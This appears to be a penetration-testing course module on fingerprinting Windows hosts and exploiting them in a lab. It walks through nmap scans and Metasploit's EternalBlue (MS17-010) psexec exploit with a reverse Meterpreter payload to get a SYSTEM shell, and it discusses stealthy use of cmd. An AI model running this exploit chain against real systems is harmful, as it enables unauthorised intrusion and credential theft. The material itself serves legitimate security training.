## Enumerating Windows & Fingerprinting Methods

This module assumes you have already performed your host enumeration phase and understand what services are commonly seen on hosts. We are just attempting to give you a few quick tricks to determine if a host is likely a Windows machine. Check out the [Network Enumeration With NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) module for a more detailed look at host enumeration and fingerprinting.

Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128.

#### Pinged Host

	AstraX01@htb[/htb]$ ping 192.168.86.39

Nmap has a cool capability built in to help with OS identification and many other scripted scans to check for anything from a specific vulnerability to information gathered from SNMP. For this example, we will utilize the `-O` option with verbose output `-v` to initialize an OS Identification scan against our target `192.168.86.39`. As we scroll through the shell session below and look at the results, a few things give this away as a Windows host.

If you run into issues and the scans turn up little results, attempt again with the `-A` and `-Pn` options. This will perform a different scan and may work. For more info on how this process works, check out this article from the [Nmap Documentation](https://nmap.org/book/man-os-detection.html). Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination.

#### OS Detection Scan

	AstraX01@htb[/htb]$ sudo nmap -v -O 192.168.86.39

Now that we know we are dealing with a Windows 10 host, we need to enumerate the services we can see to determine if we have a potential avenue of exploitation. To perform banner grabbing, we can use several different tools. Netcat, Nmap, and many others can perform the enumeration we need, but for this instance, we will look at a simple Nmap script called `banner.nse`.

It will attempt to connect to the port and glean any information it can from it. In the session below, Nmap tried to connect to each port, but the only ports to give back a response were ports 902 and 912. Based on the page banner, they have something to do with VMWare Workstation. We can attempt to find an exploit dealing with that protocol, or we can further enumerate the other ports. In a real pentest, you will want to be as thorough as possible, making sure you have the full lay of the land.

#### Banner Grab to Enumerate Ports

	AstraX01@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nse

## Bats, DLLs, & MSI Files

When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use.

#### Payload Types to Consider

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.

* [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion.

* [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks

* [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file.

* [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects.

Now that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

Below you will find examples of different payload generation methods and ways to transfer our payloads to the victim. We will talk about some of these methods at a high level since our focus is on the payload generation itself and the different ways to acquire a shell on the target.

#### Payload Transfer and Execution:

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

## Example Compromise Walkthrough

1. Enumerate The Host

Ping, Netcat, Nmap scans, and even Metasploit are all good options to start enumerating our potential victims. To start this time, we will utilize an Nmap scan. The enumeration portion of any exploit chain is arguably the most critical piece of the puzzle. Understanding the target and what makes it tick will raise your chances of gaining a shell.

#### Enumerate the Host

	AstraX01@htb[/htb]$ nmap -v -A 10.129.201.97

We figured out a few things during scanning & validation of the example host in question. It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services. Now that we have gathered some information let's determine our potential exploit path.  
`IIS` could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016. With this in mind, it could be a solid bet that our victim is vulnerable since it falls in that window. Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2. Search for and decide on an exploit path

*Open `msfconsole` and search for EternalBlue,*

#### Determine an Exploit Path

	msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
	msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
	
	msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97
	msf6 auxiliary(scanner/smb/smb_ms17_010) > run

Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.

3. Select Exploit & Payload, then Deliver

#### Choose & Configure Our Exploit & Payload

	msf6 > search eternal

For this instance, we dug through MSF's exploit modules utilizing the search function to look for an exploit matching EternalBlue. The list above was the result. Since I have had more luck with the `psexec` version of this exploit, we will try that one first. Let's choose it and continue the setup.

#### Configure The Exploit & Payload

	msf6 > use 2

	msf6 exploit(windows/smb/ms17_010_psexec) > options

This time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` payload. You can change this as you wish for a different shell type or obfuscate your attack more, as shown in the previous payloads sections. With our options set, let's give this a try and see if we land a shell.

4. Execute Attack, and Receive A Callback.

#### Execute Our Attack

	msf6 exploit(windows/smb/ms17_010_psexec) > exploit

	meterpreter > getuid

Success! We have landed our exploit and gained a shell session. A `SYSTEM` level shell at that. As seen in the earlier MSF modules, now that we have an open session through Meterpreter, we are presented with the `meterpreter >` prompt. From here, we can utilize Meterpreter to run further commands to gather system information, steal user credentials, or use another post-exploitation module against the host. If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.

5. Identify the Native Shell.

#### Identify Our Shell


	meterpreter > shell

	C:\Windows\system32>

When we executed the Meterpreter command `shell`, it started another process on the host and dropped us into a system shell. Can you determine what we are in from the prompt? Just seeing `C:\Windows\system32>` can clue us in that we are just in a `cmd.exe shell`. To make sure, simply running the command help from within the shell will also let you know. If we were dropped into PowerShell, our prompt would look like `PS C:\Windows\system32>`. The PS in front lets us know it is a PowerShell session. Congrats on dropping into a shell on our latest exploited Windows host.

## CMD-Prompt and PowerShells for Fun and Profit.

We are fortunate with Windows hosts to have not one but two choices for shells to utilize by default. Now you may be wondering:

`Which one is the right one to use?`

The answer is simple, the one that provides you with the capability you need at the time. Compare `cmd` and `PowerShell` for a minute to get a sense of what they offer and when it would be best to pick one over the other.

CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output.


Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as `Execution Policy` and `User Account Control (UAC)` can inhibit your ability to execute commands and scripts on the host. These considerations affect `PowerShell` but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd.

Use `CMD` when:

- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.

